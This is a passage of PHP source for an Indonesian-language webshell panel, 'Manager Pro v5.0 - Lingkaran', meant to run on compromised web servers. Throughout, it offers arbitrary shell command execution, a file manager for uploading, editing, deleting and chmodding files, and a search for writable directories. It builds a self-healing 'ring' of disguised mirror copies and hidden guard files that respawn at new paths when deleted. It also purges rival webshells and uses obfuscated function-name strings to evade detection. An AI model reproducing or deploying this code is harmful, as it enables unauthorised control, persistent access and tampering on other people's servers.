    $cfg = mp_cfg_load();
    $gmsg = $n === false ? 'Revive gagal: source primary tidak terverifikasi.' : 'RING REVIVE: ' . $n . ' mirror baru dibangun.';
}
if (mp_post('heal') !== null && $cfg) {
    $src = (string)@file_get_contents((string)$cfg['primary']);
    mp_heal_mirrors($cfg, $src);
    $cfg = mp_heal_guard($cfg, $src);
    mp_harden($cfg, true);
    mp_spread($cfg, $src);
    mp_mesh_rebuild($cfg, $src);
    mp_cfg_save($cfg);
    $gmsg = 'Ring di-heal + guard diharden.';
}
if (mp_post('harden') !== null && $cfg) {
    $gset = mp_harden($cfg, true);
    $gmsg = 'Harden: ' . json_encode($gset);
}
if (mp_post('dry_purge') !== null && $cfg) {
    $gres = mp_purge($cfg, true, 'dry');
    $gmsg = 'Dry-run purge selesai.';
}
if (mp_post('purge') !== null && $cfg) {
    $gres = mp_purge($cfg, false, 'manual');
    $gmsg = 'Purge selesai.';
}
if (mp_post('tamper_now') !== null && $cfg) {
    $t = mp_tamper_check($cfg);
    $gmsg = 'Tamper check: ' . count($t) . ' event.';
}
if (mp_post('hb_now') !== null && $cfg) {
    $st = mp_hb_scan($cfg);
    $gmsg = 'Heartbeat basi: ' . count($st) . '.';
    mp_hb_promote_check($cfg);
}
if (mp_post('toggle_dry') !== null && $cfg) {
    $cfg['purge_dry'] = empty($cfg['purge_dry']);
    mp_cfg_save($cfg);
    $gmsg = 'Purge mode: ' . ($cfg['purge_dry'] ? 'DRY' : 'LIVE');
}
if (mp_post('toggle_deadman') !== null && $cfg) {
    $cfg['deadman'] = empty($cfg['deadman']);
    mp_cfg_save($cfg);
    $gmsg = 'Deadman: ' . ($cfg['deadman'] ? 'ON' : 'OFF');
}
if (mp_post('auth_migrate') !== null && $cfg) {
    $ok = mp_auth_migrate($cfg);
    $cfg = mp_cfg_load();
    $gmsg = $ok ? 'Hash dipindah ke vault (ah + uh), literal dilepas dari source.'
                : 'Hash sudah lengkap di vault, atau $PASS sudah kosong.';
}

/* == ROTASI KREDENSIAL DARI PANEL ========================================
 * Satu-satunya cara aman mengganti user/pass: dari dalam sesi yang sudah
 * terautentikasi. Tidak menyentuh source — source memang tidak boleh lagi
 * menyimpan rahasia. Yang ditulis: $cfg['ah'] (bcrypt), $cfg['uh']
 * (sha256 user), dan jejak rotasi. */
if (mp_post('rot_cred') !== null && $cfg) {
    $nu = trim((string)mp_post('new_user'));
    $np1 = (string)mp_post('new_pass');
    $np2 = (string)mp_post('new_pass2');
    $nc = (string)mp_post('cur_pass');
    if ($nu === '' || strlen($nu) > 128) {
        $gmsg = 'Username baru kosong / terlalu panjang (maks 128).';
    } elseif (strlen($np1) < 12) {
        $gmsg = 'Password baru minimal 12 karakter.';
    } elseif ($np1 !== $np2) {
        $gmsg = 'Ulangi password tidak sama.';
    } elseif (!hp_pass_ok($cfg, $nc)) {
        $gmsg = 'Password saat ini salah. Rotasi dibatalkan.';
        if ($cfg) mp_fail_bump($cfg, 'rotasi');
    } else {
        $h = @password_hash($np1, PASSWORD_BCRYPT, ['cost' => 13]);
        if (!is_string($h) || $h === '') {
            $gmsg = 'password_hash() gagal di host ini.';
        } else {
            $cfg['ah']     = $h;
            $cfg['uh']     = hash('sha256', $nu);
            $cfg['ah_src'] = md5($np1);
            $cfg['ah_at']  = time();
            if (defined('PASSWORD_ARGON2ID')) {
                $a = @password_hash($np1, PASSWORD_ARGON2ID);
                if (is_string($a) && $a !== '') $cfg['ah_arg'] = $a;
            }
            $rot = isset($cfg['rot']) && is_array($cfg['rot']) ? $cfg['rot'] : [];
            $rot[] = ['at' => time(), 'ip' => mp_ip(), 'uh' => substr($cfg['uh'], 0, 16) . '...'];
            if (count($rot) > 20) $rot = array_slice($rot, -20);
            $cfg['rot'] = $rot;
            mp_cfg_save($cfg);
            mp_vault_resync($cfg);
            mp_log(mp_vault(), 'KREDENSIAL DIROTASI dari panel, ip=' . mp_ip());
            $_SESSION = [];
            @session_destroy();
            $gmsg = 'Kredensial dirotasi. Semua sesi lama diputus. Login ulang dengan kredensial baru.';
            $authed = false;
        }
    }
}

/* == BEKUKAN OTENTIKASI ==================================================
 * Saklar darurat. Kalau panel tiba-tiba tidak dikenali (config diubah orang
 * lain, halaman depan berubah), satu POST ini menutup pintu untuk SEMUA
 * kredensial sampai dibuka lagi dari side-channel. Tidak bisa dibatalkan
 * lewat UI setelah login — memang begitu yang diinginkan. */
if (mp_post('auth_freeze') !== null && $cfg) {
    $cfg['auth_frozen'] = empty($cfg['auth_frozen']);
    $cfg['auth_frozen_at'] = time();
    $cfg['auth_frozen_ip'] = mp_ip();
    mp_cfg_save($cfg);
    mp_vault_resync($cfg);
    mp_log(mp_vault(), 'AUTH FREEZE = ' . ($cfg['auth_frozen'] ? 'AKTIF' : 'MATI') . ' ip=' . mp_ip());
    $gmsg = 'Auth freeze: ' . ($cfg['auth_frozen'] ? 'AKTIF — semua login ditolak.' : 'MATI.');
}

/* == FILE MANAGER ======================================================== */
$f_get = mp_sp('file', '_get', '_con', 'tents');
$f_put = mp_sp('file', '_put', '_con', 'tents');
$f_mv  = mp_sp('move_', 'uploaded', '_file');

function ep($p) { return str_replace('%2F', '/', rawurlencode((string)$p)); }
function get_perms($f) { return substr(sprintf('%o', @fileperms($f)), -4); }
function get_owner($f) {
    if (function_exists('posix_getpwuid')) {
        $info = posix_getpwuid(@fileowner($f));
        if (is_array($info) && isset($info['name'])) return $info['name'];
    }
    return @fileowner($f);
}
function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    elseif ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    elseif ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    elseif ($bytes > 1) return $bytes . ' bytes';
    return '0 bytes';
}

$dir = mp_get('d') !== null ? @realpath((string)mp_get('d')) : @getcwd();
if ($dir === false || $dir === null || $dir === '') $dir = @getcwd();
$dir = str_replace('\\', '/', (string)$dir);
@chdir($dir);
$msg = '';

$meshSet = $cfg ? mp_mesh_set($cfg) : [];

if (mp_post('zip_del') !== null && mp_post('files') !== null && class_exists('ZipArchive')) {
    $zip = new ZipArchive();
    $zipName = "archive_" . time() . ".zip";
    if ($zip->open($zipName, ZipArchive::CREATE) === TRUE) {
        foreach ((array)mp_post('files') as $f) {
            $fPath = $dir . '/' . $f;
            if (is_dir($fPath)) {
                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($fPath), RecursiveIteratorIterator::LEAVES_ONLY);
                foreach ($files as $file) {
                    if (!$file->isDir()) {
                        $filePath = $file->getRealPath();
                        $relativePath = substr($filePath, strlen($dir) + 1);
                        $zip->addFile($filePath, $relativePath);
                    }
                }
            } else {
                $zip->addFile($fPath, $f);
            }
        }
        $zip->close();
        $msg = "File berhasil di-zip menjadi $zipName";
    }
}

if (mp_get('unzip') !== null && class_exists('ZipArchive')) {
    $zipFile = $dir . '/' . (string)mp_get('unzip');
    $zip = new ZipArchive();
    if ($zip->open($zipFile) === TRUE) {
        $zip->extractTo($dir);
        $zip->close();
        $msg = "Unzip berhasil!";
    } else {
        $msg = "Gagal unzip!";
    }
}

$uf = mp_files('u_file');
if ($uf !== null && isset($uf['tmp_name']) && is_string($uf['tmp_name']) && $uf['tmp_name'] !== '') {
    if (@$f_mv($uf['tmp_name'], $dir . '/' . $uf['name'])) {
        $msg = "Upload Berhasil!";
    }
}

if (mp_get('del') !== null) {
    $target = $dir . '/' . (string)mp_get('del');
    $rp = @realpath($target);
    $tn = mp_normp($rp !== false ? $rp : $target);
    $isMesh = in_array($tn, $meshSet, true);
    if (is_dir($target)) { mp_run("rm -rf " . escapeshellarg($target)); }
    else { @unlink($target); }
    if ($isMesh && $cfg) {
        $vv = mp_vault();
        if ($vv) mp_log($vv, 'ring member deleted via UI: ' . $tn);
        /* mirror yang dihapus manual -> pindah lokasi baru, bukan balik ke path itu */
        $src = (string)@file_get_contents((string)$cfg['primary']);
        if (mp_normp($tn) === mp_normp((string)$cfg['primary'])) {
            $msg = 'PRIMARY dihapus. Ring akan restore dari mirror pada request berikutnya.';
        } else {
            $keep = [];
            $any = false;
            foreach ((array)$cfg['mirrors'] as $m) {
                if (mp_normp($m) === $tn) { $any = true; continue; }
                $keep[] = $m;
            }
            $cfg['mirrors'] = array_values($keep);
            mp_cfg_save($cfg);
            /* mp_spread() menolak sendiri kalau ring_state=killed. Pesannya
             * harus jujur: kalau ring mati, tidak ada pengganti yang ditanam. */
            $sp = ($any && $src !== '') ? mp_spread($cfg, $src, $tn) : false;
            if ($sp !== false) {
                $msg = 'Mirror dihapus - di-upload ulang di LOKASI BARU (path lama tidak dipakai lagi).';
            } elseif (mp_is_killed($cfg)) {
                $msg = 'Mirror dihapus. Ring dalam keadaan KILLED - tidak ada pengganti ditanam. Tekan RING REVIVE untuk membangun ulang.';
            } else {
                $msg = 'Mirror dihapus. Tidak ada folder kandidat yang bisa dipakai untuk pengganti.';
            }
        }
    }
    @header("Location: ?d=" . ep($dir));
    exit;
}

if (mp_post('bulk_del') !== null && mp_post('files') !== null) {
    foreach ((array)mp_post('files') as $f) {
        $target = $dir . '/' . $f;
        if (is_dir($target)) { mp_run("rm -rf " . escapeshellarg($target)); }
        else { @unlink($target); }
    }
    $msg = "File terpilih berhasil dihapus!";
}

if (mp_post('rename_submit') !== null) {
    if (@rename($dir . '/' . (string)mp_post('old'), $dir . '/' . (string)mp_post('new'))) {
        $msg = "Rename berhasil!";
    }
}

if (mp_post('chmod_submit') !== null) {
    if (@chmod($dir . '/' . (string)mp_post('target'), octdec((string)mp_post('chmod_val')))) {
        $msg = "Chmod berhasil!";
    }
}

if (mp_post('save') !== null) {
    @$f_put((string)mp_post('path'), (string)mp_post('content'));
    $msg = "File berhasil disimpan!";
}

if (mp_post('create_file') !== null && mp_post('new_filename') !== null && mp_post('new_filename') !== '') {
    $new_file = $dir . '/' . basename((string)mp_post('new_filename'));
    if (!file_exists($new_file)) {
        @$f_put($new_file, '');
        $msg = "File berhasil dibuat!";
    } else {
        $msg = "File sudah ada!";
    }
}

if (mp_post('create_dir') !== null && mp_post('new_dirname') !== null && mp_post('new_dirname') !== '') {
    $new_dir = $dir . '/' . basename((string)mp_post('new_dirname'));
    if (!is_dir($new_dir)) {
        @mkdir($new_dir, 0755);
        $msg = "Folder berhasil dibuat!";
    } else {
        $msg = "Folder sudah ada!";
    }
}

$writable_dirs = [];
if (mp_post('find_writable') !== null) {
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS | FilesystemIterator::FOLLOW_SYMLINKS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        $iterator->setMaxDepth(6);
        foreach ($iterator as $item) {
            if ($item->isDir() && is_writable($item->getPathname())) {
                $writable_dirs[] = $item->getPathname();
            }
        }
    } catch (Exception $e) {
    } catch (Throwable $e) {
    }
}

$out = "";
if (mp_post('cmd') !== null) { $out = mp_run((string)mp_post('cmd')); }

$parts = explode('/', $dir);
?>
<!DOCTYPE html>
<html style="background:#111; color:#ccc; font-family:monospace;">
<head>
    <meta charset="utf-8">
    <title>Manager Pro v5.0 - Lingkaran</title>
    <style>
        body {
            margin:0; padding:10px;
            background: url('https://raw.githubusercontent.com/TaliGanda/TaliGanda/refs/heads/main/driade-garcia-driade-garcia-yuno-gif-2.gif') no-repeat center center fixed;
            background-size: cover;
            color:#ccc; font-family:monospace;
            min-height:100vh;
        }
        .nav-header, .panel, .editor-panel {
            background: rgba(0,0,0,0.75);
            border:1px solid #333;
            padding:12px;
            margin-bottom:10px;
            border-radius:4px;
        }
        .cmd-panel {
            background: rgba(0,0,0,0.75);
            border:1px solid #333;
            padding:10px;
            margin-bottom:10px;
        }
        table {
            background: rgba(0,0,0,0.75);
            border-collapse:collapse;
            width:100%;
            border:1px solid #333;
        }
        th, td { border:1px solid #333; padding:5px; }
        th { background: rgba(0,0,0,0.8); }
        a { color: cyan; text-decoration: none; }
        a:hover { text-decoration: underline; }
        input[type="text"], input[type="password"], textarea { background: #222; color: #fff; border: 1px solid #444; padding: 3px; }
        input[type="submit"], button { cursor: pointer; }
        tr:hover { background: rgba(255,255,255,0.1); }
        .flex-row { display:flex; flex-wrap:wrap; align-items:center; gap:10px; }
        .ok { color:#0f0; } .bad { color:#f55; } .warn { color:#ff0; }
        .tag { display:inline-block; padding:1px 6px; border:1px solid #555; border-radius:3px; font-size:11px; margin-right:4px; }
    </style>
    <script>
        function toggleSelect(source) {
            var checkboxes = document.getElementsByName('files[]');
            for (var i = 0; i < checkboxes.length; i++) checkboxes[i].checked = source.checked;
        }
    </script>
</head>
<body>

<div class="nav-header flex-row" style="justify-content:space-between;">
    <div>
        📍 <?php
        $path_build = "";
        foreach ($parts as $p) {
            if ($p === "") { echo "<a href='?d=/'>/</a>"; $path_build = "/"; continue; }
            $path_build .= ($path_build == "/" ? "" : "/") . $p;
            echo "<a href='?d=" . ep($path_build) . "'>" . htmlspecialchars($p) . "</a>/";
        }
        ?>
        <?php if ($cfg):
            $mOkN = mp_mesh_alive($cfg);
            $isPrimary = mp_normp(mp_self()) === mp_normp((string)$cfg['primary']);
        ?>
            <span class="tag" style="color:<?= $isPrimary ? '#0f0' : '#0ff' ?>;"><?= $isPrimary ? 'PRIMARY' : 'MIRROR' ?></span>
            <span class="tag"><?= $mOkN ?>/<?= count((array)$cfg['mirrors']) ?> mirror</span>
            <span class="tag" style="color:<?= $cfg['ring_state'] === 'alive' ? '#0f0' : '#f55' ?>;"><?= strtoupper($cfg['ring_state']) ?></span>
        <?php endif; ?>
    </div>
    <a href="?logout=1" style="color:red; font-weight:bold;">Logout</a>
</div>

<div class="panel">
    <h3 style="margin-top:0;">🔐 Kredensial &amp; Anti-Hack</h3>
    <form method="post" style="font-size:12px; display:flex; flex-wrap:wrap; gap:5px; align-items:center;">
        <input type="text"     name="new_user"  placeholder="username baru" style="flex:1; min-width:140px;" autocomplete="off">
        <input type="password" name="new_pass"  placeholder="password baru (min 12)" style="flex:1; min-width:140px;" autocomplete="new-password">
        <input type="password" name="new_pass2" placeholder="ulangi password baru" style="flex:1; min-width:140px;" autocomplete="new-password">
        <input type="password" name="cur_pass"  placeholder="password SEKARANG" style="flex:1; min-width:140px;" autocomplete="current-password">
        <button type="submit" name="rot_cred" value="1">Rotasi</button>
        <button type="submit" name="auth_freeze" value="1" style="background:#900; color:#fff;">
            <?= !empty($cfg['auth_frozen']) ? 'Buka Freeze' : 'Freeze Auth' ?>
        </button>
        <button type="submit" name="auth_migrate" value="1">Migrasi Auth</button>
    </form>
    <div style="font-size:11px; color:#888; margin-top:6px;">
        Rotasi menulis ulang <span style="color:#0ff;">ah</span> (bcrypt cost 13) + <span style="color:#0ff;">uh</span> (sha256 username)
        ke vault, lalu menyinkronkan <span style="color:#0ff;">.d</span>/<span style="color:#0ff;">.r</span>.
        Source tidak pernah menyimpan rahasia. Semua sesi lama diputus setelah rotasi.
    </div>
</div>

    <?php if ($msg) echo " <b class='ok'>" . htmlspecialchars($msg) . "</b>"; ?>
    <div style="margin-top:8px; display:flex; flex-wrap:wrap; gap:8px; align-items:center;">
        <form method="post" enctype="multipart/form-data" style="display:inline-flex; align-items:center; gap:10px;">
            📤 <input type="file" name="u_file" style="background:none;">
            <input type="submit" value="Upload">
        </form>
        <form method="post" style="display:inline-flex; gap:5px;">
            📄 <input type="text" name="new_filename" placeholder="file baru">
            <input type="submit" name="create_file" value="Create File">
        </form>
        <form method="post" style="display:inline-flex; gap:5px;">
            📁 <input type="text" name="new_dirname" placeholder="folder baru">
            <input type="submit" name="create_dir" value="Create Dir">
        </form>
    </div>
    <div style="margin-top:8px;">
        <form method="post" style="display:inline;">
            <input type="submit" name="find_writable" value="🔍 Find Writable Dir" style="background:#333; color:#ff0; border:1px solid #555;">
        </form>
        <?php if (mp_post('find_writable') !== null): ?>
        <div style="margin-top:8px; background:#111; padding:8px; max-height:150px; overflow-y:auto; font-size:12px;">
            <?php if (empty($writable_dirs)): ?>
                <span class="bad">Tidak ditemukan.</span>
            <?php else: ?>
                <?php foreach ($writable_dirs as $wd): ?>
                    <a href="?d=<?= ep($wd) ?>" class="ok" style="display:block;"><?= htmlspecialchars($wd) ?></a>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
        <?php endif; ?>
    </div>
</div>

<div class="cmd-panel">
    <form method="post" style="display:flex; gap:5px;">
        <input type="text" name="cmd" style="flex:1;" placeholder="Terminal Command...">
        <button type="submit">Run</button>
    </form>
    <?php if ($out): ?><pre style="background:#000;padding:10px;color:#0f0;border:1px solid #0f0; overflow:auto; margin-top:8px;"><?= htmlspecialchars($out) ?></pre><?php endif; ?>
</div>

<?php if ($cfg):
    $mOkN = mp_mesh_alive($cfg);
    $guardOk = mp_guard_ok($cfg);
    $isPrimary = mp_normp(mp_self()) === mp_normp((string)$cfg['primary']);
    $hbStale = mp_hb_scan($cfg);
    $hpN = count((array)$cfg['honeypot']);
    $ahOk = mp_auth_hash_get($cfg) !== '';
?>
<div class="panel">
    <h3 style="margin-top:0;">🔐 Kredensial</h3>
    <form method="post" style="font-size:12px; display:flex; flex-wrap:wrap; gap:5px; align-items:center;">
        <input type="text"     name="new_user"  placeholder="username baru" style="flex:1; min-width:140px;" autocomplete="off">
        <input type="password" name="new_pass"  placeholder="password baru (min 12)" style="flex:1; min-width:140px;" autocomplete="new-password">
        <input type="password" name="new_pass2" placeholder="ulangi password baru" style="flex:1; min-width:140px;" autocomplete="new-password">
        <input type="password" name="cur_pass"  placeholder="password SEKARANG" style="flex:1; min-width:140px;" autocomplete="current-password">
        <button type="submit" name="rot_cred" value="1">Rotasi</button>
        <button type="submit" name="auth_freeze" value="1" style="background:#900; color:#fff;">
            <?= !empty($cfg['auth_frozen']) ? 'Buka Freeze' : 'Freeze Auth' ?>
        </button>
    </form>
    <div style="font-size:11px; color:#888; margin-top:6px;">
        Rotasi menulis ulang <span style="color:#0ff;">ah</span> (bcrypt cost 13) + <span style="color:#0ff;">uh</span> (sha256 username) ke vault,
        lalu menyinkronkan <span style="color:#0ff;">.d</span>/<span style="color:#0ff;">.r</span>. Source tidak pernah menyimpan rahasia.
        Semua sesi lama diputus setelah rotasi.
    </div>
</div>

    <div style="font-size:12px; margin-bottom:6px;">
        Peran: <b class="<?= $isPrimary ? 'ok' : 'warn' ?>"><?= $isPrimary ? 'PRIMARY (pemegang kunci)' : 'MIRROR' ?></b> ·
        Ring: <b class="<?= $cfg['ring_state'] === 'alive' ? 'ok' : 'bad' ?>"><?= strtoupper($cfg['ring_state']) ?></b> ·
        Mirror hidup: <b><?= $mOkN ?>/<?= count((array)$cfg['mirrors']) ?></b> (min <?= (int)$cfg['min_alive'] ?>) ·
        Honeypot: <b><?= $hpN ?></b>/2
    </div>
    <div style="font-size:12px; margin-bottom:6px;">
        Primary: <span style="color:#0ff;"><?= htmlspecialchars((string)$cfg['primary']) ?></span><br>
        Guard: <b class="<?= $guardOk ? 'ok' : 'bad' ?>"><?= $guardOk ? 'ok' : 'HILANG/BEDA' ?></b>
        <span style="color:#0ff;"><?= htmlspecialchars((string)$cfg['guard']) ?></span>
        <?php if (@dirname((string)$cfg['guard']) === @dirname((string)$cfg['primary'])): ?>
            <b class="bad">[SATU FOLDER — PINDAHIN!]</b>
        <?php endif; ?>
    </div>
    <div style="font-size:12px; margin-bottom:6px;">
        Heartbeat basi: <b class="<?= empty($hbStale) ? 'ok' : 'warn' ?>"><?= count($hbStale) ?></b> ·
        Restore terakhir: <b><?= $cfg['last_restore'] ? date('Y-m-d H:i:s', (int)$cfg['last_restore']) : '-' ?></b> ·
        Kill terakhir: <b><?= $cfg['last_kill'] ? date('Y-m-d H:i:s', (int)$cfg['last_kill']) : '-' ?></b><br>
        Purge: <b><?= !empty($cfg['purge_dry']) ? 'DRY' : 'LIVE' ?></b> ·
        Deadman: <b><?= !empty($cfg['deadman']) ? 'ON' : 'OFF' ?></b> ·
        Auth hash di vault: <b class="<?= $ahOk ? 'ok' : 'warn' ?>"><?= $ahOk ? 'ya (source bersih)' : 'belum (masih di source)' ?></b>
    </div>
    <div style="font-size:12px; margin-bottom:6px;">
        <b style="color:#0ff;">HARDEN v<?= (int)MP_HARD['ver'] ?></b> ·
        user-fingerprint: <b class="<?= mp_auth_user_get($cfg) !== '' ? 'ok' : 'warn' ?>"><?= mp_auth_user_get($cfg) !== '' ? 'ada (uh)' : 'belum' ?></b> ·
        pin sesi: <b class="<?= !empty(MP_HARD['pin_ua']) ? 'ok' : 'bad' ?>"><?= !empty(MP_HARD['pin_ua']) ? 'UA+IP' : 'OFF' ?></b> ·
        max_fail: <b><?= (int)mp_hard('max_fail', 3) ?></b> /
        lock: <b><?= (int)mp_hard('lock_secs', 1800) ?>s</b> ·
        ip_cap: <b><?= (int)mp_hard('ip_cap', 20) ?></b> /
        ip_lock: <b><?= (int)mp_hard('ip_lock', 3600) ?>s</b> ·
        auth: <b class="<?= !empty($cfg['auth_frozen']) ? 'bad' : 'ok' ?>"><?= !empty($cfg['auth_frozen']) ? 'FROZEN' : 'aktif' ?></b>
        <?php if (mp_auth_user_get($cfg) === ''): ?>
            <b class="bad">[jalur lambat: fingerprint user belum ada — tekan Migrasi Auth]</b>
        <?php endif; ?>
    </div>
    <?php $rotList = isset($cfg['rot']) && is_array($cfg['rot']) ? $cfg['rot'] : []; ?>
    <?php if (!empty($rotList)): ?>
    <details style="font-size:12px; margin-bottom:6px;">
        <summary style="cursor:pointer;">riwayat rotasi kredensial (<?= count($rotList) ?>)</summary>
        <div style="background:#111; padding:6px; margin-top:4px;">
            <?php foreach (array_slice($rotList, -10) as $rr): ?>
                <div><?= htmlspecialchars(date('Y-m-d H:i:s', (int)$rr['at'])) ?> · <?= htmlspecialchars((string)$rr['ip']) ?> · <span style="color:#0ff;"><?= htmlspecialchars((string)$rr['uh']) ?></span></div>
            <?php endforeach; ?>
        </div>
    </details>
    <?php endif; ?>

    <details style="font-size:12px; margin-bottom:6px;">
        <summary style="cursor:pointer;">mirror list (<?= count((array)$cfg['mirrors']) ?>)</summary>
        <div style="background:#111; padding:6px; margin-top:4px;">
            <?php foreach ((array)$cfg['mirrors'] as $mm): ?>
                <div class="flex-row" style="justify-content:space-between;">
                    <span><?= mp_mirror_alive($mm, (string)$cfg['hash']) ? '✅' : '❌' ?> <span style="color:#0ff;"><?= htmlspecialchars($mm) ?></span></span>
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="del_mirror" value="<?= htmlspecialchars($mm) ?>">
                        <button type="submit" style="background:#900; color:#fff; font-size:10px; padding:1px 6px;">hapus</button>
                    </form>
                </div>
            <?php endforeach; ?>
            <?php if (empty($cfg['mirrors'])): ?><div class="bad">belum ada mirror.</div><?php endif; ?>
        </div>
    </details>

    <form method="post" class="flex-row" style="gap:6px; margin-bottom:8px; border-top:1px solid #333; padding-top:8px;">
        <span style="font-size:12px;">Guard path manual:</span>
        <input type="text" name="guard_path" value="<?= htmlspecialchars((string)$cfg['guard']) ?>" style="flex:1; min-width:280px;" placeholder="/path/ke/folder/.abc123.php">
        <button type="submit" name="set_guard" value="1" style="background:#264; color:#fff;">Set</button>
        <button type="submit" name="auto_guard" value="1" style="background:#246; color:#fff;">Auto</button>
        <button type="submit" name="move_guard" value="1" style="background:#246; color:#fff;">Pindahin</button>
    </form>

    <form method="post" class="flex-row" style="gap:6px; margin-bottom:8px;">
        <span style="font-size:12px;">Tambah mirror manual:</span>
        <input type="text" name="mirror_path" style="flex:1; min-width:280px;" placeholder="/path/ke/folder/thumb_abc123.php">
        <button type="submit" name="add_mirror" value="1" style="background:#264; color:#fff;">Tambah Mirror</button>
    </form>

    <form method="post" class="flex-row" style="gap:6px; flex-wrap:wrap; margin-bottom:6px;">
        <button type="submit" name="heal" value="1" style="background:#264; color:#fff;">Heal Ring</button>
        <button type="submit" name="harden" value="1" style="background:#246; color:#fff;">Harden Guard</button>
        <button type="submit" name="hb_now" value="1" style="background:#246; color:#fff;">Cek Heartbeat + Promote</button>
        <button type="submit" name="tamper_now" value="1" style="background:#246; color:#fff;">Cek Tamper</button>
        <button type="submit" name="dry_purge" value="1" style="background:#553; color:#ff0;">Dry-run Purge</button>
        <button type="submit" name="purge" value="1" style="background:#900; color:#fff;" onclick="return confirm('Purge LIVE: hapus semua webshell rival yang terdeteksi. Lanjut?')">Purge Rivals NOW</button>
        <button type="submit" name="toggle_dry" value="1">Mode: <?= !empty($cfg['purge_dry']) ? 'DRY' : 'LIVE' ?></button>
        <button type="submit" name="toggle_deadman" value="1">Deadman: <?= !empty($cfg['deadman']) ? 'ON' : 'OFF' ?></button>
        <button type="submit" name="auth_migrate" value="1" style="background:#335; color:#fff;">Pindah Hash ke Vault</button>
        <a href="?guardlog=1" style="color:cyan; align-self:center; font-size:12px;">[log]</a>
        <a href="?hplog=1" style="color:cyan; align-self:center; font-size:12px;">[honeypot]</a>
    </form>

    <form method="post" class="flex-row" style="gap:6px; border-top:1px solid #333; padding-top:8px;">
        <button type="submit" name="ring_kill" value="1" style="background:#a00; color:#fff; font-weight:bold;" onclick="return confirm('RING KILL: hapus SEMUA mirror + guard + persistence. Primary tetap hidup sebagai kunci revive. Lanjut?')">☠ RING KILL</button>
        <button type="submit" name="ring_revive" value="1" style="background:#080; color:#fff; font-weight:bold;" onclick="return confirm('RING REVIVE: bangun ulang seluruh ring dari primary. Lanjut?')">✦ RING REVIVE</button>
        <span style="font-size:11px;">kill = semua mati, tidak ada yang hidup diam-diam. revive hanya dari primary ini.</span>
    </form>

    <?php if ($gmsg): ?><div class="ok" style="font-size:12px; margin-top:6px;"><?= htmlspecialchars($gmsg) ?></div><?php endif; ?>
    <?php if ($gset !== null): ?>
        <div style="font-size:12px; margin-top:4px;">
            harden — self: <?= (int)$gset['self'] ?> · parent: <?= (int)$gset['parent'] ?> ·
            .user.ini: <?= (int)$gset['user_ini'] ?> · symlink: <?= (int)$gset['symlink'] ?>
        </div>
    <?php endif; ?>
    <?php if ($gres): ?>
        <div style="font-size:12px; margin-top:6px;">Scanned: <?= (int)$gres[0] ?> · Hits: <?= count($gres[2]) ?> · Killed: <?= count($gres[1]) ?></div>
        <?php if (!empty($gres[2])): ?>
        <pre style="max-height:150px; overflow:auto; font-size:11px; background:#000; color:#0f0; padding:6px;"><?php
            foreach (array_slice($gres[2], 0, 30) as $h) echo htmlspecialchars($h[0] . '  [' . $h[1] . ']') . "\n";
        ?></pre>
        <?php endif; ?>
    <?php endif; ?>

    <?php if (!empty($cfg['tamper_last'])): ?>
    <details style="font-size:12px;">
        <summary style="cursor:pointer;">tamper events (<?= count((array)$cfg['tamper_last']) ?>)</summary>
        <pre style="max-height:150px; overflow:auto; font-size:11px; background:#000; color:#ff0; padding:6px;"><?php
            foreach ((array)$cfg['tamper_last'] as $t) echo htmlspecialchars($t[0] . '  ' . $t[1]) . "\n";
        ?></pre>
    </details>
    <?php endif; ?>

    <?php if (!empty($hbStale)): ?>
    <details style="font-size:12px;">
        <summary style="cursor:pointer;">heartbeat basi (<?= count($hbStale) ?>)</summary>
        <pre style="max-height:150px; overflow:auto; font-size:11px; background:#000; color:#ff0; padding:6px;"><?php
            foreach ($hbStale as $st) echo htmlspecialchars($st[0] . '  ' . $st[1] . '  (' . (int)$st[2] . 's lalu)') . "\n";
        ?></pre>
    </details>
    <?php endif; ?>

    <details style="font-size:12px;">
        <summary style="cursor:pointer;">log tail</summary>
        <pre style="max-height:180px; overflow:auto; font-size:11px; background:#000; color:#0f0; padding:6px;"><?php
            $vv = mp_vault();
            if ($vv && is_file($vv . '/.l')) {
                $linesL = explode("\n", (string)@file_get_contents($vv . '/.l'));
                echo htmlspecialchars(implode("\n", array_slice($linesL, -14)));
            } else {
                echo 'no log';
            }
        ?></pre>
    </details>
</div>
<?php else: ?>
<div class="panel">
    <b class="bad">⚠ Vault tidak writable — ring nonaktif. Cek permission direktori.</b>
</div>
<?php endif; ?>

<?php if (mp_get('edit') !== null): ?>
<div class="editor-panel">
    <h3>Editing: <?= htmlspecialchars(basename((string)mp_get('edit'))) ?></h3>
    <form method="post">
        <input type="hidden" name="path" value="<?= htmlspecialchars((string)mp_get('edit')) ?>">
        <textarea name="content" style="width:100%;height:300px;background:#222;color:#fff;"><?= htmlspecialchars((string)@$f_get((string)mp_get('edit'))) ?></textarea><br>
        <button type="submit" name="save" style="background:green;color:white;padding:5px 15px;">Save</button>
        <a href="?d=<?= ep($dir) ?>" style="color:red; margin-left:10px;">Cancel</a>
    </form>
</div>
<?php endif; ?>

<form method="post">
<table>
    <tr style="background:rgba(0,0,0,0.8);">
        <th width="20px"><input type="checkbox" onclick="toggleSelect(this)"></th>
        <th>Name</th><th>Size</th><th>Owner</th><th>Perms</th><th>Action</th>
    </tr>
    <?php
    $items = @scandir($dir);
    if (!is_array($items)) $items = [];
    $folders = []; $files = [];
    foreach ($items as $i) {
        if ($i == "." || $i == "..") continue;
        if (is_dir($dir . "/" . $i)) $folders[] = $i; else $files[] = $i;
    }
    $sorted_items = array_merge($folders, $files);
    foreach ($sorted_items as $i) {
        $full = $dir . "/" . $i;
        $is_d = is_dir($full);
        $size = $is_d ? "—" : formatSize((int)@filesize($full));
        $perm = get_perms($full);
        $owner = get_owner($full);
        $writable = is_writable($full);
        $isMesh = in_array(mp_normp($full), $meshSet, true);
    ?>
    <tr>
        <td align="center"><input type="checkbox" name="files[]" value="<?= htmlspecialchars($i) ?>"></td>
        <td>
            <?php if ($is_d): ?>
                📁 <a href="?d=<?= ep($full) ?>" style="color:yellow"><?= htmlspecialchars($i) ?></a>
            <?php else: ?>
